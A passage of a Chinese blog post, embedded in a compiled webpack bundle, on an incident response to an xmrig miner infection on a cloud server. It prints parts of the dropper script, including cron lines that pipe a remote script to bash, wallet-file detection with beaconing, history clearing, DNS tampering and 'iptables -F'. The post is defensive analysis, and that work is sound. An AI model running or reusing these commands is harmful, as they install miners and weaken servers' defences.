(window.webpackJsonp=window.webpackJsonp||[]).push([[212],{832:function(s,n,a){"use strict";a.r(n);var e=a(17),t=Object(e.a)({},(function(){var s=this,n=s.$createElement,a=s._self._c||n;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"_20230817-阿里云美国某服务器被挂挖矿恶意软件的解决方法-分析恶意脚本"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_20230817-阿里云美国某服务器被挂挖矿恶意软件的解决方法-分析恶意脚本"}},[s._v("#")]),s._v(" 20230817-阿里云美国某服务器被挂挖矿恶意软件的解决方法，分析恶意脚本")]),s._v(" "),a("h2",{attrs:{id:"报警短信"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#报警短信"}},[s._v("#")]),s._v(" 报警短信")]),s._v(" "),a("p",[s._v("凌晨收到告警短信，爬起来解决问题先。")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("【某里云】尊敬的XXXX - XXXX ,云监控-云服务器ECS<美西-XXX-XXX-XXX/XXX.XXX.XXX.XXX>于<2023-08-17 02:17:32>发生报警，(Agent)cpu.total（99.78%>=80%），持续时间0分钟\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h2",{attrs:{id:"进入系统"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#进入系统"}},[s._v("#")]),s._v(" 进入系统")]),s._v(" "),a("p",[s._v("查看原因")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("top查看负载\n有一个熟悉有陌生的进程 xmrig 挖矿软件\n\n# ps aux |grep xmrig\n/etc/.system/php/xmrig --config=/etc/.system/php/config.json \n\nkill掉进程\n进程杀不到，杀了又启动一个\n\n于是删除目录： \nrm -rf /etc/.system/\n再杀进程，发现进程没有了，\n不出意外过几分钟可能会再次启动的。\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br")])]),a("p",[s._v("判断服务器是被挂了挖矿的恶意软件！")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://imgoss.xgss.net/picgo/bingdu-ecs-guama.jpg?aliyun",alt:"bingdu-ecs-guama"}})]),s._v(" "),a("h2",{attrs:{id:"查看定时任务"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#查看定时任务"}},[s._v("#")]),s._v(" 查看定时任务")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("ll /etc/crontab\n-rw-r--r-- 1 root root 151 May 15  2018 /etc/crontab\n\ncat /etc/crontab\n*/30 * * * * root curl -fsSL http://XXX.XXX.XXX.XXX/php/php_8020.sh | bash \n*/30 * * * * root cd1 -fsSL http://XXX.XXX.XXX.XXX/php/php_8020.sh | bash \n\nll /etc/cron\ncron.d/       cron.daily/   cron.deny     cron.hourly/  cron.monthly/ crontab       crontab~      crontaz~      cron.weekly/  \n\n刻意的文件有\ncrontab       crontab~      crontaz~ \n文件内容都是 每30分钟从 某个IP中下载一个恶意脚本并且执行\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br")])]),a("h3",{attrs:{id:"无法编辑"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#无法编辑"}},[s._v("#")]),s._v(" 无法编辑")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("chmod 777 -R /etc/crontab\nchmod: changing permissions of ‘/etc/crontab’: Operation not permitted\nvi /etc/crontab 也没有权限\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[s._v("解决：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("\nchattr -ia /var/spool/cron\nchattr -ia /etc/crontab\n\nvi /etc/crontab\nrm -rf   /etc/crontab~\nrm -rf /etc/crontaz~\nsystemctl restart crond\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br")])]),a("h2",{attrs:{id:"去掉远程密钥登录"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#去掉远程密钥登录"}},[s._v("#")]),s._v(" 去掉远程密钥登录")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("# netstat -tunpl|grep ssh\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      28838/sshd          \ntcp        0      0 0.0.0.0:11222           0.0.0.0:*               LISTEN      28838/sshd          \ntcp        0      0 0.0.0.0:XXXX           0.0.0.0:*               LISTEN      28838/sshd     本机正在的ssh\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("\nchattr -ia /etc/ssh/sshd_config \n编辑\nvi /etc/ssh/sshd_config \n把恶意的端口22和11222 关闭掉\nvi /etc/ssh/sshd_config\nsystemctl restart sshd \n\n# netstat -tunpl|grep ssh\ntcp        0      0 0.0.0.0:60920           0.0.0.0:*               LISTEN      1214/sshd    \n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br")])]),a("h2",{attrs:{id:"在某云安全组中只运行某个ip登录ssh"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#在某云安全组中只运行某个ip登录ssh"}},[s._v("#")]),s._v(" 在某云安全组中只运行某个ip登录SSH")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://imgoss.xgss.net/picgo/image-20230817101528002.png?aliyun",alt:"image-20230817101528002"}})]),s._v(" "),a("p",[s._v("保证其他人无法登录ssh")]),s._v(" "),a("h1",{attrs:{id:"下载恶意代码分析"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#下载恶意代码分析"}},[s._v("#")]),s._v(" 下载恶意代码分析")]),s._v(" "),a("p",[s._v("下载恶意脚本的代码，看一下如何解决这个问题，一段一段的来分析是怎么挂马的")]),s._v(" "),a("h2",{attrs:{id:"_1-修改-resolv-conf文件"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_1-修改-resolv-conf文件"}},[s._v("#")]),s._v(" 1.修改 resolv.conf文件")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("于是我决定下载 http://XXX.XXX.XXX.XXX/php/php_8020.sh 然后分析一下\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h3",{attrs:{id:"恶意代码"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#恶意代码"}},[s._v("#")]),s._v(" 恶意代码：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('#!/bin/bash -e\n\nVERSION=22.06\nulimit -n 65535 \nfunction SetupNameServers(){  \ngrep -q 8.8.8.8 /etc/resolv.conf || ${CHATTR} -i /etc/resolv.conf 2>/dev/null 1>/dev/null; tntrecht -i /etc/resolv.conf 2>/dev/null 1>/dev/null; echo "nameserver 8.8.8.8" >> /etc/resolv.conf; ${CHATTR} +i /etc/resolv.conf 2>/dev/null 1>/dev/null; tntrecht +i /etc/resolv.conf 2>/dev/null 1>/dev/null\ngrep -q 8.8.4.4 /etc/resolv.conf || ${CHATTR} -i /etc/resolv.conf 2>/dev/null 1>/dev/null; tntrecht -i /etc/resolv.conf 2>/dev/null 1>/dev/null; echo "nameserver 8.8.4.4" >> /etc/resolv.conf; ${CHATTR} +i /etc/resolv.conf 2>/dev/null 1>/dev/null; tntrecht +i /etc/resolv.conf 2>/dev/null 1>/dev/null\n}\nSetupNameServers\n\n修改dns\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br")])]),a("h3",{attrs:{id:"解决"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#解决"}},[s._v("#")]),s._v(" 解决")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("vi  /etc/resolv.conf\noptions timeout:2 attempts:3 rotate single-request-reopen\n; generated by /usr/sbin/dhclient-script\nnameserver 100.100.2.136\nnameserver 100.100.2.138\nnameserver 8.8.8.8\nnameserver 8.8.4.4\nnameserver 8.8.8.8\nnameserver 8.8.4.4\nnameserver 8.8.8.8\nnameserver 8.8.4.4\nnameserver 8.8.8.8\nnameserver 8.8.4.4\nnameserver 8.8.8.8\nnameserver 8.8.4.4\nnameserver 8.8.8.8\nnameserver 8.8.4.4\nnameserver 8.8.8.8\nnameserver 8.8.4.4\nnameserver 8.8.8.8\nnameserver 8.8.4.4\nnameserver 8.8.8.8\nnameserver 8.8.4.4\nnameserver 8.8.8.8\nnameserver 8.8.4.4\nnameserver 8.8.8.8\nnameserver 8.8.4.4\nnameserver 8.8.8.8\nnameserver 8.8.4.4\nnameserver 8.8.8.8\nnameserver 8.8.4.4\nnameserver 8.8.8.8\nnameserver 8.8.4.4\nnameserver 8.8.8.8\nnameserver 8.8.4.4\nnameserver 8.8.8.8\nnameserver 8.8.4.4\n把文件改成\nvi  /etc/resolv.conf\noptions timeout:2 attempts:3 rotate single-request-reopen\n; generated by /usr/sbin/dhclient-script\nnameserver 100.100.2.136\nnameserver 100.100.2.138\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br"),a("span",{staticClass:"line-number"},[s._v("28")]),a("br"),a("span",{staticClass:"line-number"},[s._v("29")]),a("br"),a("span",{staticClass:"line-number"},[s._v("30")]),a("br"),a("span",{staticClass:"line-number"},[s._v("31")]),a("br"),a("span",{staticClass:"line-number"},[s._v("32")]),a("br"),a("span",{staticClass:"line-number"},[s._v("33")]),a("br"),a("span",{staticClass:"line-number"},[s._v("34")]),a("br"),a("span",{staticClass:"line-number"},[s._v("35")]),a("br"),a("span",{staticClass:"line-number"},[s._v("36")]),a("br"),a("span",{staticClass:"line-number"},[s._v("37")]),a("br"),a("span",{staticClass:"line-number"},[s._v("38")]),a("br"),a("span",{staticClass:"line-number"},[s._v("39")]),a("br"),a("span",{staticClass:"line-number"},[s._v("40")]),a("br"),a("span",{staticClass:"line-number"},[s._v("41")]),a("br"),a("span",{staticClass:"line-number"},[s._v("42")]),a("br"),a("span",{staticClass:"line-number"},[s._v("43")]),a("br")])]),a("h2",{attrs:{id:"_2-搜索关键字"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_2-搜索关键字"}},[s._v("#")]),s._v(" 2.搜索关键字")]),s._v(" "),a("h3",{attrs:{id:"恶意代码-2"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#恶意代码-2"}},[s._v("#")]),s._v(" 恶意代码：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("if [ -f ~/ /home -maxdepth 6 -name 'trc20usdt' ] # 它在指定的目录（~ 或 /home）下搜索名为 'trc20usdt' 的文件，并且搜索的深度不超过 6 层子目录。如果找到了符合条件的文件，条件将被视为满足，对应的代码块将会执行。\n  then\n    echo \"Crypto running\"\n    curl 6nj0me.XXXX.io  # 上报地址做了修改。\n    curl -fsSL http://XX.XX.XX.XX/php/php.sh | bash \n  elif [ -f ~/ /home -maxdepth 6 -name 'TronWeb' ]\n    then\n      echo \"Crypto running\"\n      curl 6nj0me.XXX.io # 地址做了修改\n      curl -fsSL http://XX.XX.XX.XX/php/php.sh | bash \n      history -c \n      \n  elif [ -f ~/ /home -maxdepth 6 -name 'hdkey' ]\n    then\n      echo \"Crypto running\"\n      curl 6nj0me.xxx.io\n      curl -fsSL http://XX.XX.XX.XX/php/php.sh | bash \n      history -c \n      \n  elif [ -f ~/ /home -maxdepth 6 -name 'ethers' ]\n    then\n      echo \"Crypto running\"\n      curl 6nj0me.xxx.io\n      curl -fsSL http://XX.XX.XX.XX/php/php.sh | bash \n      history -c \n      \n  elif [ -f ~/ /home -maxdepth 6 -name 'web3' ]\n    then\n      echo \"Crypto running\"\n      curl 6nj0me.xxx.io\n      curl -fsSL http://XX.XX.XX.XX/php/php.sh | bash \n      history -c \n      \n  elif [ -f ~/ /home -maxdepth 6 -name 'wormhole' ]\n    then\n      echo \"Crypto running\"\n      curl 6nj0me.xxx.io\n      curl -fsSL http://XX.XX.XX.XX/php/php.sh | bash \n      history -c \n      \n  elif [ -f ~/ /home -maxdepth 6 -name 'bitcoin' ]\n    then\n      echo \"Crypto running\"\n      curl 6nj0me.xxx.io\n      curl -fsSL http://XX.XX.XX.XX/php/php.sh | bash \n      history -c \n      \n  elif [ -f ~/ /home -maxdepth 6 -name 'binance' ]\n    then\n      echo \"Crypto running\"\n      curl 6nj0me.xxx.io\n      curl -fsSL http://XX.XX.XX.XX/php/php.sh | bash \n      history -c \n      \n  elif [ -f ~/ /home -maxdepth 6 -name 'ethereum' ]\n    then\n      echo \"Crypto running\"\n      curl 6nj0me.xxx.io\n      curl -fsSL http://XX.XX.XX.XX/php/php.sh | bash \n      history -c \n      \n  elif [ -f ~/ /home -maxdepth 6 -name 'hdwallet' ]\n    then\n      echo \"Crypto running\"\n      curl 6nj0me.xxx.io\n      curl -fsSL http://XX.XX.XX.XX/php/php.sh | bash \n      history -c \n      \n  else\n      echo \"not Crypto running \"\nfi\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br"),a("span",{staticClass:"line-number"},[s._v("28")]),a("br"),a("span",{staticClass:"line-number"},[s._v("29")]),a("br"),a("span",{staticClass:"line-number"},[s._v("30")]),a("br"),a("span",{staticClass:"line-number"},[s._v("31")]),a("br"),a("span",{staticClass:"line-number"},[s._v("32")]),a("br"),a("span",{staticClass:"line-number"},[s._v("33")]),a("br"),a("span",{staticClass:"line-number"},[s._v("34")]),a("br"),a("span",{staticClass:"line-number"},[s._v("35")]),a("br"),a("span",{staticClass:"line-number"},[s._v("36")]),a("br"),a("span",{staticClass:"line-number"},[s._v("37")]),a("br"),a("span",{staticClass:"line-number"},[s._v("38")]),a("br"),a("span",{staticClass:"line-number"},[s._v("39")]),a("br"),a("span",{staticClass:"line-number"},[s._v("40")]),a("br"),a("span",{staticClass:"line-number"},[s._v("41")]),a("br"),a("span",{staticClass:"line-number"},[s._v("42")]),a("br"),a("span",{staticClass:"line-number"},[s._v("43")]),a("br"),a("span",{staticClass:"line-number"},[s._v("44")]),a("br"),a("span",{staticClass:"line-number"},[s._v("45")]),a("br"),a("span",{staticClass:"line-number"},[s._v("46")]),a("br"),a("span",{staticClass:"line-number"},[s._v("47")]),a("br"),a("span",{staticClass:"line-number"},[s._v("48")]),a("br"),a("span",{staticClass:"line-number"},[s._v("49")]),a("br"),a("span",{staticClass:"line-number"},[s._v("50")]),a("br"),a("span",{staticClass:"line-number"},[s._v("51")]),a("br"),a("span",{staticClass:"line-number"},[s._v("52")]),a("br"),a("span",{staticClass:"line-number"},[s._v("53")]),a("br"),a("span",{staticClass:"line-number"},[s._v("54")]),a("br"),a("span",{staticClass:"line-number"},[s._v("55")]),a("br"),a("span",{staticClass:"line-number"},[s._v("56")]),a("br"),a("span",{staticClass:"line-number"},[s._v("57")]),a("br"),a("span",{staticClass:"line-number"},[s._v("58")]),a("br"),a("span",{staticClass:"line-number"},[s._v("59")]),a("br"),a("span",{staticClass:"line-number"},[s._v("60")]),a("br"),a("span",{staticClass:"line-number"},[s._v("61")]),a("br"),a("span",{staticClass:"line-number"},[s._v("62")]),a("br"),a("span",{staticClass:"line-number"},[s._v("63")]),a("br"),a("span",{staticClass:"line-number"},[s._v("64")]),a("br"),a("span",{staticClass:"line-number"},[s._v("65")]),a("br"),a("span",{staticClass:"line-number"},[s._v("66")]),a("br"),a("span",{staticClass:"line-number"},[s._v("67")]),a("br"),a("span",{staticClass:"line-number"},[s._v("68")]),a("br"),a("span",{staticClass:"line-number"},[s._v("69")]),a("br"),a("span",{staticClass:"line-number"},[s._v("70")]),a("br"),a("span",{staticClass:"line-number"},[s._v("71")]),a("br")])]),a("h3",{attrs:{id:"恶意代码分析"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#恶意代码分析"}},[s._v("#")]),s._v(" 恶意代码分析")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('这段代码是一个 Bash 脚本，用于检测系统中是否存在一系列文件，并根据文件的存在与否执行相应的操作。脚本的大致逻辑如下：\n\n1. 首先，通过一系列条件判断检查系统中是否存在特定的文件（文件名），这些文件名都与加密货币相关。\n2. 如果找到其中一个文件，表示系统中可能正在运行加密货币软件，脚本会输出 "Crypto running"，然后执行以下操作：\n   - 向 `6nj0me.xxx.io` 发送请求（可能用于跟踪感染的主机）。\n   - 从 `http://XX.XX.XX.XX/php/php.sh` 下载一个 PHP 脚本，并执行它（可能用于安装恶意软件或挖矿程序）。\n   - 清除命令历史记录，使用 `history -c` 命令删除执行过的命令记录，以尽量隐藏操作。\n3. 如果没有找到上述任何文件，脚本会输出 "not Crypto running"。\n\n需要注意的是，这段代码的意图看起来是在检查系统中是否存在特定的文件，如果存在，则执行一些恶意操作。这可能是一种恶意软件或入侵活动。如果你发现类似的代码在你的系统上运行，强烈建议立即采取行动，清除恶意脚本，并采取措施来保护你的系统。如果不确定如何处理，请寻求专业的技术支持。\n\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br")])]),a("h3",{attrs:{id:"解决-2"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#解决-2"}},[s._v("#")]),s._v(" 解决")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("find /home -maxdepth 6 -name 'trc20usdt'\nfind / -maxdepth 6 -name 'trc20usdt'\nfind /  -maxdepth 6 -name 'ethers'\n\n...\n搜索不到什么。\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br")])]),a("h2",{attrs:{id:"_3-判断xmrig-log"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_3-判断xmrig-log"}},[s._v("#")]),s._v(" 3.判断xmrig.log")]),s._v(" "),a("h3",{attrs:{id:"恶意代码-3"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#恶意代码-3"}},[s._v("#")]),s._v(" 恶意代码：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('if [ -f "/etc/.system/php/xmrig.log" ]\nthen\n    echo "process possible running"\n    current=$(date +%s)\n    last_modified=$(stat -c "%Y" /etc/.system/php/xmrig.log)\n   if [ $(($current-$last_modified)) -gt 600 ]; then\n        echo "no rr process running";\n    else\n    echo "rr process running"\n    exit 1\n   fi\nelse \n    echo "rr process not running"\nfi\n\n解释：\n这段代码用于检查一个特定的日志文件是否存在，然后检查该文件的上次修改时间，如果文件的上次修改时间超过10分钟，脚本会打印 "no rr process running"，表示未发现 "rr" 进程正在运行。如果文件的上次修改时间在10分钟之内，脚本会打印 "rr process running"，并退出脚本。如果文件不存在，则脚本会打印 "rr process not running"。\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br")])]),a("h2",{attrs:{id:"_4-iptables-f"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_4-iptables-f"}},[s._v("#")]),s._v(" 4.iptables -F")]),s._v(" "),a("p",[s._v("当你运行 iptables -F 命令时，它会清空（删除）当前已经定义的所有规则，恢复防火墙到初始状态。这将导致系统的防火墙规则被移除，网络流量将不再受到任何防火墙规则的限制。换句话说，所有之前定义的规则都将被删除，允许所有的网络流量自由通过。")]),s._v(" "),a("h3",{attrs:{id:"恶意代码-4"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#恶意代码-4"}},[s._v("#")]),s._v(" 恶意代码")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("iptables -F\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h2",{attrs:{id:"_5-关闭防火墙和安全软件等"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_5-关闭防火墙和安全软件等"}},[s._v("#")]),s._v(" 5.关闭防火墙和安全软件等")]),s._v(" "),a("h3",{attrs:{id:"恶意代码-5"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#恶意代码-5"}},[s._v("#")]),s._v(" 恶意代码")]),s._v(" "),a("div",{staticClass:"language- 